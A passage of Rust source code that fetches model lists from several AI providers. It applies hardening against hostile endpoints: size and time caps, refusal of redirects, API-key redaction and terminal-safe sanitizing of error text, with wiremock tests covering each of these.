//! Model listing for the connect flow: free functions that fetch the model ids a provider
//! offers, decoupled from the pinned [`crate::Provider`] so they can run for a provider that is
//! not active — and with a freshly typed key. Each wrapper resolves the base URL through the
//! same trust boundary as provider construction ([`crate::selection::resolve_base_url_for`],
//! which routes `*_BASE_URL` overrides through `validate_base_url`) and every request uses the
//! redirect-disabled client (`build_http_client` + `reject_redirect`), so a 3xx or an invalid
//! override is refused before the API key is sent anywhere.
//!
//! This module also owns the *bounds* on that fetch ([`ListBounds`]): a deadline, a response-body
//! byte cap, and a list-length cap. They live here rather than on the shared client because the
//! same client serves completion requests, where a long generation is legitimate.

use std::time::Duration;

use serde::Deserialize;

use crate::base_url::{build_http_client, join_url, reject_redirect};

/// The bounds one model-list fetch runs under.
///
/// Threaded through the `*_at` seams so tests can pin tight values without exposing a runtime knob:
/// an env-configurable bound would be a new public interface for a hardening change, and would give
/// an attacker-influenced environment a way to widen the very limit it is being held to.
#[derive(Debug, Clone, Copy)]
pub(crate) struct ListBounds {
    /// Total deadline for one request: DNS + connect + TLS + time-to-first-byte + body read.
    ///
    /// Applied per-request (`RequestBuilder::timeout`) and **never** on the client. Do not "simplify"
    /// this onto `build_http_client`: the same client serves completion requests, where a long
    /// generation is legitimate, and a client-level deadline would cut them off. A per-request total
    /// deadline also subsumes a `connect_timeout`, which reqwest offers only at client level.
    pub(crate) timeout: Duration,
    /// Hard ceiling on buffered response bytes.
    pub(crate) max_body_bytes: usize,
    /// Hard ceiling on buffered bytes when capturing a **non-2xx** response's error body.
    ///
    /// Deliberately far below `max_body_bytes`: an honest provider error body is a JSON envelope of
    /// a few hundred bytes, and nothing above this is a diagnostic. It matters more than the
    /// success cap, not less — the error path is reached *without* a valid credential, so it is the
    /// more exposed of the two. [`read_capped`] refuses rather than truncates, so an over-cap error
    /// body simply yields no detail and the error degrades to the status line, which is what this
    /// path did before the body was captured at all.
    pub(crate) max_error_bytes: usize,
    /// Hard ceiling on returned model ids. A longer list is **refused**, not truncated — see
    /// [`normalize`].
    pub(crate) max_models: usize,
}

/// The smallest body that can hold a well-formed empty list (`{"data":[]}` is 11 bytes). A cap
/// below this could never accept an honest response, so it is a bug in the caller, not a tight
/// bound.
const MIN_BODY_BYTES: usize = 16;

impl ListBounds {
    pub(crate) const DEFAULT: Self = Self {
        // The fetch backs an interactive modal that renders "Fetching models..." with no progress,
        // so a provider that has not answered in 15s has already failed the user. Real `/v1/models`
        // responses land in well under a second; this is long enough to absorb a cold TLS handshake
        // on a slow link and short enough that "Esc: cancel" is not the only way out.
        timeout: Duration::from_secs(15),
        // OpenAI's `/v1/models` is tens of kilobytes and Ollama's `/api/tags` is a few, so this is
        // roughly fifty times the largest plausible honest response — and a bound a terminal
        // process can absorb per in-flight fetch no matter what the endpoint sends.
        max_body_bytes: 2 * 1024 * 1024,
        // Roughly a hundred times the largest plausible honest error envelope, and small enough
        // that refusing anything larger costs nothing real.
        max_error_bytes: 16 * 1024,
        // No provider publishes anywhere near this many models, and the modal is a scrolling list a
        // human reads.
        max_models: 1_000,
    };

    /// Reject bounds that cannot express a meaningful limit.
    ///
    /// Debug-only, on the `*_at` seams. A too-tight deadline or body cap fails loudly — the fetch
    /// errors — but `max_models: 0` used to make every fetch *succeed* with an empty list, the one
    /// bound whose violation produced a plausible-looking wrong answer instead of an error. These
    /// are `debug_assert`s rather than returned errors because the only constructors are
    /// `DEFAULT` and the test module: a violation is a programming mistake, not a runtime input.
    fn debug_check(self) {
        debug_assert!(
            !self.timeout.is_zero(),
            "a zero deadline cannot complete any request"
        );
        debug_assert!(
            self.max_models >= 1,
            "a list capped at zero ids can only ever yield an empty model list"
        );
        debug_assert!(
            self.max_body_bytes >= MIN_BODY_BYTES,
            "a body cap below {MIN_BODY_BYTES} bytes cannot admit even an empty list"
        );
        debug_assert!(
            self.max_error_bytes >= MIN_BODY_BYTES,
            "an error-body cap below {MIN_BODY_BYTES} bytes cannot admit even a minimal envelope"
        );
    }
}

/// Read a response body, refusing to buffer more than `max_bytes`.
///
/// `Response::bytes()` / `Response::json()` buffer to completion, so a hostile endpoint's body
/// length becomes this process's allocation — and the Ollama path needs no credential at all, so
/// anything listening on `127.0.0.1:11434` could reach it. This reads frame by frame and bails the
/// moment the running total would exceed the cap, then drops the response, which closes the
/// connection rather than draining the rest of the body.
///
/// Peak buffering is `max_bytes` plus the frame that tripped the check, and that frame's size is
/// chosen by the HTTP layer (hyper's read buffer for h1, the negotiated max frame size for h2) —
/// not by the sender — so the bound is closed rather than one-frame-open. The buffer also starts
/// empty and is never reserved from a length the sender supplied.
///
/// A `Content-Length` pre-check is deliberately absent: the header is attacker-controlled, may be
/// missing on a chunked response, and would be a second rejection path that could drift from this
/// one while buying nothing it does not already give.
///
/// Nothing about the body reaches the error. The sender controls its content and this message is
/// rendered into a modal.
async fn read_capped(mut resp: reqwest::Response, max_bytes: usize) -> anyhow::Result<Vec<u8>> {
    let mut buf: Vec<u8> = Vec::new();
    while let Some(chunk) = resp.chunk().await? {
        if buf.len() + chunk.len() > max_bytes {
            anyhow::bail!(
                "model list response exceeded the {max_bytes}-byte cap; refusing to buffer it"
            );
        }
        buf.extend_from_slice(&chunk);
    }
    Ok(buf)
}

/// The longest provider-supplied error detail this crate will carry in an error.
///
/// Set *above* the TUI's own 120-character display cap on purpose. The display boundary decides how
/// much fits on a rendered line; this one is a safety floor for every other consumer of the `pub`
/// entry points — a log line, the server crate, a future non-TUI client — none of which the TUI's
/// cap protects. Two independent bounds is the pattern this module already uses.
const DETAIL_MAX_CHARS: usize = 200;

/// Refuse a non-2xx response, carrying the provider's own diagnostic with it.
///
/// `error_for_status_ref` rather than `error_for_status` is load-bearing: it yields the
/// `reqwest::Error` *without* consuming the response, so the body is still readable. The
/// `reqwest::Error` then becomes the `anyhow` **source** and the captured detail becomes `anyhow`
/// **context** — never the other way round. `crates/tui` recovers the HTTP status by walking
/// `anyhow::Error::chain()` for a `reqwest::Error`, so replacing this with a bare `bail!` would
/// silently degrade every 401/403 to the retryable class and make the credentials step
/// unreachable. `the_status_error_survives_in_the_chain_for_classification` pins that.
///
/// The status is repeated in the context even though `reqwest::Error`'s own Display carries it:
/// the TUI renders only the first 120 characters of `{err:#}`, context first, so without it a long
/// provider message would push the status off the rendered line.
async fn check_status(
    raw: reqwest::Response,
    bounds: ListBounds,
    secret: Option<&str>,
) -> anyhow::Result<reqwest::Response> {
    let Some(status_err) = raw.error_for_status_ref().err() else {
        return Ok(raw);
    };
    // Always `Some` in practice: `error_for_status_ref` returns `Err` only for a 4xx/5xx, and that
    // error always carries its status. The `None` arms below are the type's shape, not a reachable
    // path — they exist so this cannot panic if reqwest ever widens what that constructor returns.
    let status = status_err.status().map(|s| s.as_u16());
    let detail = error_detail(raw, bounds, secret).await;
    Err(
        anyhow::Error::new(status_err).context(match (status, detail) {
            (Some(code), Some(detail)) => format!("the provider returned HTTP {code}: {detail}"),
            (Some(code), None) => format!("the provider returned HTTP {code} with no error detail"),
            (None, Some(detail)) => format!("the provider returned an error status: {detail}"),
            (None, None) => "the provider returned an error status".to_string(),
        }),
    )
}

/// Capture one bounded, sanitized, key-redacted line of a non-2xx response body, or `None`.
///
/// `None` on any failure — an over-cap body, a transport error mid-read, a body that normalizes to
/// nothing. Every such case degrades to the status line alone, which is what this path did before
/// the body was captured; nothing about the body reaches that error, which [`read_capped`] already
/// guarantees.
///
/// **Residual, stated plainly:** [`redact_secret`] is an exact-substring match, so it is defeated
/// by any *meaningful* character the sender inserts into the middle of an echoed key — a literal
/// space, a hyphen, anything that is neither a control character nor [`is_invisible`]. No
/// substring method can close that, and fuzzy matching would mangle honest text while still losing
/// to base64 or a key split across two JSON fields. It is accepted because it requires a hostile
/// endpoint deliberately obfuscating a credential it *already holds*, in a message shown only to
/// that credential's own owner — no attacker gains anything. What redaction actually defends is the
/// realistic case: an honest gateway echoing the key verbatim in a diagnostic, and the near-misses
/// (control characters, invisible characters, our own U+FFFD, stored whitespace) that would
/// otherwise let a verbatim echo slip through unredacted.
///
/// The order of the three transforms is deliberate and must not be rearranged. The invariant is
/// that **every transform which deletes characters runs before redaction, and every transform which
/// truncates runs after it**:
/// 1. **normalize** first — it deletes control, invisible, and replacement characters, so a key the
///    sender split with an `ESC`, a newline, a zero-width space, or an invalid UTF-8 byte is
///    rejoined into a contiguous string that the exact-substring match can find;
/// 2. **redact** second, before any truncation, so a cut cannot bisect the key and leave a usable
///    prefix;
/// 3. **cap** last — it truncates, so it must not run while an unredacted key is still present.
///
/// Both halves of that invariant have a regression test: `a_key_split_by_a_newline_in_the_body_is
/// _still_redacted` for the first, and the padding in `an_error_body_echoing_the_api_key_is
/// _redacted` for the second.
async fn error_detail(
    resp: reqwest::Response,
    bounds: ListBounds,
    secret: Option<&str>,
) -> Option<String> {
    let body = read_capped(resp, bounds.max_error_bytes).await.ok()?;
    // Lossy rather than `from_utf8().ok()?`: one invalid byte should not discard an otherwise
    // readable diagnostic, and U+FFFD is not a control character.
    let text = String::from_utf8_lossy(&body);
    let extracted = extract_error_message(&text);
    let message = extracted.unwrap_or_else(|| text.into_owned());
    let capped = cap_chars(
        redact_secret(normalize_detail(&message), secret),
        DETAIL_MAX_CHARS,
    );
    (!capped.is_empty()).then_some(capped)
}

/// Pull the provider's own message out of the two envelope shapes every provider on this path uses:
/// `{"error":{"message":"..."}}` (OpenAI, DeepSeek, Anthropic, Gemini) and `{"error":"..."}`
/// (Ollama). Anything else returns `None` and the caller falls back to the raw text.
///
/// That fallback is not a trust downgrade: a `message` field is exactly as sender-chosen as a raw
/// body, so both carry the same trust level and both go through the same normalize/redact/cap.
/// Extracting the envelope is noise reduction, not a boundary.
fn extract_error_message(body: &str) -> Option<String> {
    let envelope: ErrorEnvelope = serde_json::from_str(body).ok()?;
    Some(match envelope.error {
        ErrorPayload::Detailed { message } | ErrorPayload::Text(message) => message,
    })
}

/// Characters deleted from a captured detail on top of [`char::is_control`].
///
/// Two independent reasons, both load-bearing:
///
/// * **Terminal spoofing.** `char::is_control` covers only Unicode category Cc, so the bidi
///   overrides and zero-width format characters (Cf) sail straight through it. U+202E
///   RIGHT-TO-LEFT OVERRIDE can visually reverse a rendered line and U+200B ZERO WIDTH SPACE can
///   hide a word boundary — the same class of attack as the raw `ESC` this filter already refuses,
///   and this text is entirely sender-chosen.
/// * **Redaction evasion.** Every character here is invisible or near-invisible, so an endpoint
///   could plant one inside an echoed API key to break [`redact_secret`]'s exact-substring match
///   while the key still reads normally on screen. Deleting them rejoins the key *before*
///   redaction runs, which is the ordering invariant [`error_detail`] documents.
///
/// U+FFFD is in the list for the second reason specifically, and it is the sharpest case: it is
/// inserted by **our own** `from_utf8_lossy` at a byte offset the *sender* chooses, so a single
/// invalid byte planted inside an echoed key used to split it and leak the whole credential in the
/// clear. It carries no diagnostic value either — it says only "the endpoint sent bytes that are
/// not UTF-8", which a garbled message already conveys.
/// `a_key_split_by_an_invalid_utf8_byte_is_still_redacted` pins this.
fn is_invisible(c: char) -> bool {
    matches!(
        c,
        '\u{00ad}'                 // SOFT HYPHEN
        | '\u{061c}'               // ARABIC LETTER MARK
        | '\u{180e}'               // MONGOLIAN VOWEL SEPARATOR
        | '\u{200b}'..='\u{200f}' // zero-width space/non-joiner/joiner, LRM, RLM
        | '\u{202a}'..='\u{202e}' // bidi embedding and override
        | '\u{2060}'..='\u{2064}' // word joiner, invisible operators
        | '\u{2066}'..='\u{2069}' // bidi isolates
        | '\u{feff}'               // ZERO WIDTH NO-BREAK SPACE / BOM
        | '\u{fffd}'               // REPLACEMENT CHARACTER — see above
    )
}

/// Flatten to a single line: every control character deleted, then trimmed.
///
/// The result is one line **by construction** — `\n` and `\r` are control characters, so they are
/// deleted along with the rest. That is what protects the layout: a multi-line error would push the
/// modal's own trusted rows — the remedy, and on the manual step the input box — past the bottom of
/// the screen, turning a model picker into a credential-phishing surface. Control characters go for
/// the separate reason that a raw `ESC` written into a terminal cell is an escape-sequence
/// injection, and this text is entirely sender-chosen.
///
/// **Deleting the newline rather than cutting at it is load-bearing for redaction, not a style
/// choice.** This used to be `.lines().next()`, which is a *structural* split that the
/// control-character filter never saw. A body echoing the key with a newline planted inside it —
/// `"invalid key sk-test-0123456789abcdef01234567\n89abcdef was rejected"` — was cut at that
/// newline, and the surviving 32-character fragment no longer matched the key, so
/// [`redact_secret`]'s exact-substring replace found nothing and the fragment was rendered in the
/// clear. The split point is sender-chosen, so the leaked prefix could be nearly the whole key.
/// Deleting the newline instead rejoins the two halves *before* redaction runs, which is the
/// invariant [`error_detail`] documents: every transform that deletes characters must run before
/// redaction, so a key it reassembles is still matchable.
/// `a_key_split_by_a_newline_in_the_body_is_still_redacted` pins this.
///
/// **The deleted characters are not replaced with a space, and must not be.** Substituting a
/// separator would read better — a two-line body currently renders as `...errorSecond line...`,
/// fused at the seam — but it would reintroduce exactly the bug above: the inserted space would
/// sit inside the rejoined key and defeat [`redact_secret`]'s exact-substring match again. The
/// readability cost is the price of the security property, deliberately paid.
fn normalize_detail(message: &str) -> String {
    message
        .chars()
        .filter(|c| !c.is_control() && !is_invisible(*c))
        .collect::<String>()
        .trim()
        .to_string()
}

/// Replace every occurrence of the API key with a visible marker.
///
/// An endpoint that echoes the submitted key back — a misconfigured gateway, or an attacker-chosen
/// `*_BASE_URL` override — would otherwise put the user's live credential into a terminal cell and
/// into their scrollback. An empty secret is skipped: `str::replace` with an empty pattern matches
/// at every character boundary. The marker is visible rather than a silent deletion so a user who
/// sees it knows why the message reads oddly.
fn redact_secret(text: String, secret: Option<&str>) -> String {
    let Some(secret) = secret else {
        return text;
    };
    // The needle is normalized exactly as the haystack was. Without this, a key that is merely
    // *stored* with surrounding whitespace never matches: `resolve_key`
    // (`crates/tui/src/selection.rs`) filters only for emptiness and does not trim, so a key read
    // from a file or `export KEY=$(cat key.txt)` keeps its trailing newline — while the haystack
    // has had every control character deleted. The two could then never be equal, and an endpoint
    // echoing the key verbatim would be rendered unredacted. Normalizing both sides is what makes
    // the comparison meaningful rather than incidental.
    let needle = normalize_detail(secret);
    if needle.is_empty() {
        // A whitespace-only key normalizes away entirely. Replacing the empty pattern would match
        // at every character boundary and turn the whole detail into markers.
        return text;
    }
    text.replace(&needle, "<redacted>")
}

/// Truncate to `max` **characters** (not bytes — a byte cut can split a code point) with an
/// explicit ellipsis, so a truncated message never looks like a complete one.
fn cap_chars(text: String, max: usize) -> String {
    if text.chars().count() <= max {
        return text;
    }
    let kept: String = text.chars().take(max).collect();
    format!("{kept}\u{2026}")
}

/// Build the GET for one model-list request: the redirect-disabled client for `base`, the joined
/// URL, and — the reason this function exists at all — the deadline.
///
/// The byte cap is structural because every response funnels through [`parse_capped`], but the
/// deadline used to be hand-repeated on four separate `RequestBuilder` chains, where a fifth
/// provider added later would simply omit it and nothing would fail. That is exactly the hazard
/// `base_url`'s module doc names: "every time one of them was defined in a single provider's file,
/// a sibling provider was left behind and the guarantee silently regressed." Every model-list
/// request is built here, so the deadline is structural rather than conventional; callers add only
/// their own auth headers.
fn model_list_request(base: &str, path: &str, bounds: ListBounds) -> reqwest::RequestBuilder {
    build_http_client(base)
        .get(join_url(base, path))
        // Per-request, never on the client: the same `build_http_client` serves completion
        // requests, where a long generation is legitimate.
        .timeout(bounds.timeout)
}

/// List model ids for a keyed provider against an already-resolved, already-validated `base_url`.
///
/// Deliberately does **not** re-validate `base_url`: the wrapper [`list_models`] is the trust
/// boundary and hands down a base that has already passed `validate_base_url`. Ids are
/// stable-sorted and deduped.
pub(crate) async fn list_models_at(
    provider: &str,
    base_url: &str,
    key: &str,
    bounds: ListBounds,
) -> anyhow::Result<Vec<String>> {
    bounds.debug_check();
    match provider {
        "anthropic" => list_anthropic(base_url, key, bounds).await,
        "openai" => list_openai_compatible(base_url, "/v1/models", key, bounds).await,
        "gemini" => list_gemini(base_url, key, bounds).await,
        "deepseek" => list_openai_compatible(base_url, "/models", key, bounds).await,
        other => {
            anyhow::bail!("unknown provider '{other}'; expected anthropic|openai|gemini|deepseek")
        }
    }
}

/// Resolve `provider`'s base URL (env override → production default) and list its model ids.
pub async fn list_models(provider: &str, key: &str) -> anyhow::Result<Vec<String>> {
    let base = resolve_models_base(provider)?;
    list_models_at(provider, &base, key, ListBounds::DEFAULT).await
}

/// List model ids from the local Ollama server at `base_url`, extracting each `name` (including
/// any `:tag`) verbatim so a tagged model can be selected.
pub(crate) async fn list_ollama_models_at(
    base_url: &str,
    bounds: ListBounds,
) -> anyhow::Result<Vec<String>> {
    bounds.debug_check();
    let raw = model_list_request(base_url, "/api/tags", bounds)
        .send()
        .await?;
    reject_redirect(&raw)?;
    let resp: OllamaTags = parse_capped(raw, bounds, None).await?;
    normalize(
        resp.models.into_iter().map(|m| m.name).collect(),
        bounds.max_models,
    )
}

/// List model ids from the local Ollama server at the default localhost root.
pub async fn list_ollama_models() -> anyhow::Result<Vec<String>> {
    list_ollama_models_at(crate::ollama::LOCAL_BASE, ListBounds::DEFAULT).await
}

/// Read the `*_BASE_URL` override for `provider` and resolve its base URL via the shared trust
/// boundary. This is the single place the env is read for model listing; the pure resolution
/// lives in [`crate::selection::resolve_base_url_for`].
fn resolve_models_base(provider: &str) -> anyhow::Result<String> {
    let override_value = crate::selection::RemoteChoice::parse(provider)
        .and_then(crate::selection::base_url_var)
        .and_then(std::env::var_os)
        .and_then(|raw| raw.into_string().ok())
        .filter(|v| !v.is_empty());
    crate::selection::resolve_base_url_for(provider, override_value)
}

async fn list_anthropic(base: &str, key: &str, bounds: ListBounds) -> anyhow::Result<Vec<String>> {
    let raw = model_list_request(base, "/v1/models", bounds)
        .header("x-api-key", key)
        .header("anthropic-version", crate::anthropic::ANTHROPIC_VERSION)
        .send()
        .await?;
    reject_redirect(&raw)?;
    let resp: IdList = parse_capped(raw, bounds, Some(key)).await?;
    normalize(
        resp.data.into_iter().map(|m| m.id).collect(),
        bounds.max_models,
    )
}

async fn list_openai_compatible(
    base: &str,
    path: &str,
    key: &str,
    bounds: ListBounds,
) -> anyhow::Result<Vec<String>> {
    let raw = model_list_request(base, path, bounds)
        .header("authorization", format!("Bearer {key}"))
        .send()
        .await?;
    reject_redirect(&raw)?;
    let resp: IdList = parse_capped(raw, bounds, Some(key)).await?;
    normalize(
        resp.data.into_iter().map(|m| m.id).collect(),
        bounds.max_models,
    )
}

async fn list_gemini(base: &str, key: &str, bounds: ListBounds) -> anyhow::Result<Vec<String>> {
    let raw = model_list_request(base, "/v1beta/models", bounds)
        .header("x-goog-api-key", key)
        .send()
        .await?;
    reject_redirect(&raw)?;
    let resp: GeminiModels = parse_capped(raw, bounds, Some(key)).await?;
    let ids = resp
        .models
        .into_iter()
        .map(|m| {
            m.name
                .strip_prefix("models/")
                .map(str::to_string)
                .unwrap_or(m.name)
        })
        .collect();
    normalize(ids, bounds.max_models)
}

/// Parse a 3xx-cleared, status-cleared response's body into `T` under the byte cap.
///
/// Ordering is load-bearing and unchanged from before the cap existed: `reject_redirect` has
/// already refused a 3xx, and [`check_status`] refuses a 4xx/5xx — capturing a bounded snippet of
/// its body — before a single byte of a success body is read. `secret` is the API key this request
/// carried, so it can be redacted out of a body that echoes it; `None` for Ollama, which sends no
/// credential at all.
async fn parse_capped<T: serde::de::DeserializeOwned>(
    raw: reqwest::Response,
    bounds: ListBounds,
    secret: Option<&str>,
) -> anyhow::Result<T> {
    let resp = check_status(raw, bounds, secret).await?;
    let body = read_capped(resp, bounds.max_body_bytes).await?;
    // Line and column only, and deliberately **not** `serde_json::Error`'s own Display: for an
    // `invalid_type` error that Display embeds the offending value verbatim — a body of
    // `{"data":"<attacker text>"}` renders as `invalid type: string "<attacker text>", expected a
    // sequence`. Since this message is interpolated into `connect.fetch_error` and drawn in the
    // modal, keeping it would let an endpoint place up to `max_body_bytes` of chosen text into the
    // TUI framed as this tool's own error — with no credential at all, because the Ollama path
    // targets 127.0.0.1:11434 and any local process squatting that port can drive it.
    serde_json::from_slice(&body).map_err(|e| {
        anyhow::anyhow!(
            "model list response was not valid JSON (line {}, column {})",
            e.line(),
            e.column()
        )
    })
}

/// Stable-sort, dedup, and bound a model-id list.
///
/// A list longer than `max` is **refused**, not truncated. Truncating would be a silent model
/// substitution: the models modal highlights the row matching the configured model and falls back
/// to row 0 when it is absent, so dropping the user's model off the tail would open the modal on a
/// different id, persist it on Enter, and report unqualified success — the user's model changed
/// without them asking and without being told. The retained subset is attacker-controlled on top
/// of that: an endpoint that wants a particular id at row 0 names it with an early-sorting prefix
/// and pads the list past `max`. By this cap's own premise a list this long comes only from a
/// hostile or broken endpoint, so refusing it is strictly more honest than serving an
/// attacker-chosen prefix, and it makes all three bounds reject rather than two-reject-one-degrade.
fn normalize(mut ids: Vec<String>, max: usize) -> anyhow::Result<Vec<String>> {
    ids.sort();
    ids.dedup();
    if ids.len() > max {
        // The count only. No id reaches an error the modal renders.
        anyhow::bail!(
            "model list reported {} ids, exceeding the {max}-id cap; refusing it",
            ids.len()
        );
    }
    Ok(ids)
}

#[derive(Deserialize)]
struct IdItem {
    id: String,
}

#[derive(Deserialize)]
struct IdList {
    #[serde(default)]
    data: Vec<IdItem>,
}

#[derive(Deserialize)]
struct GeminiModel {
    name: String,
}

#[derive(Deserialize)]
struct GeminiModels {
    #[serde(default)]
    models: Vec<GeminiModel>,
}

#[derive(Deserialize)]
struct OllamaModel {
    name: String,
}

#[derive(Deserialize)]
struct OllamaTags {
    #[serde(default)]
    models: Vec<OllamaModel>,
}

/// The error envelope every provider on this path wraps its diagnostic in. Unknown sibling fields
/// (Anthropic's outer `type`, Gemini's `error.code`/`error.status`) are ignored by serde's default.
#[derive(Deserialize)]
struct ErrorEnvelope {
    error: ErrorPayload,
}

/// Untagged. The two variants have disjoint JSON shapes — `Detailed` matches only an object,
/// `Text` only a string — so serde resolves them unambiguously and the declaration order does not
/// affect behaviour. Declared object-first because that is the common-case envelope, not because
/// anything depends on the order.
#[derive(Deserialize)]
#[serde(untagged)]
enum ErrorPayload {
    Detailed { message: String },
    Text(String),
}

#[cfg(test)]
mod tests {
    use super::*;
    use wiremock::matchers::{header, method, path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    #[tokio::test]
    async fn anthropic_lists_models_with_required_version_header() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .and(header("x-api-key", "test-key"))
            .and(header("anthropic-version", "2023-06-01"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "data": [{ "id": "claude-sonnet-4" }, { "id": "claude-haiku-4-5" }]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("anthropic", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["claude-haiku-4-5", "claude-sonnet-4"]);
    }

    #[tokio::test]
    async fn openai_lists_models_with_bearer() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .and(header("authorization", "Bearer test-key"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "data": [{ "id": "gpt-4o" }, { "id": "gpt-4o-mini" }]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("openai", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["gpt-4o", "gpt-4o-mini"]);
    }

    #[tokio::test]
    async fn gemini_lists_models_and_strips_the_models_prefix() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1beta/models"))
            .and(header("x-goog-api-key", "test-key"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "models": [
                    { "name": "models/gemini-2.5-pro" },
                    { "name": "models/gemini-2.5-flash" }
                ]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("gemini", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["gemini-2.5-flash", "gemini-2.5-pro"]);
    }

    #[tokio::test]
    async fn deepseek_lists_models_on_the_models_path() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/models"))
            .and(header("authorization", "Bearer test-key"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "data": [{ "id": "deepseek-chat" }]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("deepseek", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["deepseek-chat"]);
    }

    #[tokio::test]
    async fn model_lists_are_deduped_and_stable_sorted() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "data": [{ "id": "zebra" }, { "id": "alpha" }, { "id": "alpha" }]
            })))
            .mount(&server)
            .await;

        let ids = list_models_at("openai", &server.uri(), "test-key", ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["alpha", "zebra"]);
    }

    #[tokio::test]
    async fn ollama_lists_tags_extracting_names_with_tags() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/api/tags"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "models": [
                    { "name": "llama3.2:latest" },
                    { "name": "llama3.2" }
                ]
            })))
            .mount(&server)
            .await;

        let ids = list_ollama_models_at(&server.uri(), ListBounds::DEFAULT)
            .await
            .unwrap();
        assert_eq!(ids, vec!["llama3.2", "llama3.2:latest"]);
    }

    #[tokio::test]
    async fn an_auth_error_is_surfaced_as_an_error() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "bad-key", ListBounds::DEFAULT)
            .await
            .unwrap_err();
        // Exact rather than a disjunction with "status": since `check_status` names the code in
        // its own context line, the outermost message always carries "401" and the fallback arm
        // was dead slack that would have hidden a regression in that context string.
        assert!(
            err.to_string().contains("401"),
            "the outermost message must name the status: {err:#}"
        );
    }

    #[tokio::test]
    async fn a_redirect_is_rejected_and_the_key_is_not_forwarded() {
        let upstream = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(r#"{"data":[{"id":"leaked"}]}"#)
                    .insert_header("content-type", "application/json"),
            )
            .mount(&upstream)
            .await;

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(302)
                    .insert_header("location", format!("{}/v1/models", upstream.uri()).as_str())
                    .insert_header("content-type", "application/json")
                    .set_body_string(r#"{"data":[{"id":"leaked"}]}"#),
            )
            .mount(&server)
            .await;

        let result = list_models_at("openai", &server.uri(), "test-key", ListBounds::DEFAULT).await;
        assert!(
            result.is_err(),
            "a 3xx must be an error, not a parsed model list; got {result:?}"
        );
        assert!(
            upstream
                .received_requests()
                .await
                .expect("wiremock request recording must be enabled for this assertion")
                .is_empty(),
            "the redirect target must never receive the key"
        );
    }

    #[tokio::test]
    async fn an_unknown_provider_is_rejected_before_any_request() {
        assert!(
            list_models_at("local", "http://127.0.0.1:1", "k", ListBounds::DEFAULT)
                .await
                .is_err()
        );
    }

    /// Bounds tight enough for a test to reach in milliseconds, so every bound below is exercised
    /// deliberately rather than by accident of the production values.
    fn tight() -> ListBounds {
        ListBounds {
            timeout: Duration::from_secs(5),
            max_body_bytes: 64 * 1024,
            max_error_bytes: 16 * 1024,
            max_models: 1_000,
        }
    }

    #[tokio::test]
    async fn an_oversized_body_is_refused_instead_of_buffered() {
        let server = MockServer::start().await;
        // ~3.7 MiB against a 1 MiB cap. Both numbers are load-bearing: the cap must sit *above*
        // hyper's largest read frame (~400 KiB by default), not merely above its first one, or the
        // read bails on iteration one with an empty buffer and this test never exercises the
        // running total at all. It would then pass just as happily against a per-FRAME cap
        // (`chunk.len() > max_bytes`), which is functionally unbounded memory — an endpoint
        // streaming 8 KiB frames forever buffers without limit. A measured frame sequence for a
        // body this size was 8081, 16384, 32768, 24697, ..., so a cap of, say, 20_000 would still
        // be tripped by a single later frame and would not bind the cumulative bound either.
        let ids: Vec<_> = (0..150_000)
            .map(|i| serde_json::json!({ "id": format!("model-{i:06}") }))
            .collect();
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200).set_body_json(serde_json::json!({ "data": ids })),
            )
            .mount(&server)
            .await;

        let err = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_body_bytes: 1_048_576,
                ..tight()
            },
        )
        .await
        .unwrap_err();

        // `{:#}` walks the whole anyhow chain; `to_string()` would show only the outermost message
        // and could hide a leak added downstream.
        let chain = format!("{err:#}");
        assert!(
            chain.contains("1048576"),
            "the error must name the cap: {chain}"
        );
        assert!(
            chain.contains("cap"),
            "the error must name the cap: {chain}"
        );
        assert!(
            !chain.contains("model-"),
            "no response content may reach an error the modal renders: {chain}"
        );
    }

    #[tokio::test]
    async fn a_body_one_byte_over_the_cap_is_refused() {
        // The companion to `a_body_at_the_cap_is_still_accepted`: that test pins `cap`, this one
        // pins `cap + 1`, so the guard cannot drift to `> max_bytes + 1` unnoticed.
        const BODY: &str = r#"{"data":[{"id":"gpt-4o"}]}"#;
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(BODY)
                    .insert_header("content-type", "application/json"),
            )
            .mount(&server)
            .await;

        let err = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_body_bytes: BODY.len() - 1,
                ..tight()
            },
        )
        .await
        .expect_err("a body of exactly max_body_bytes + 1 must be refused");
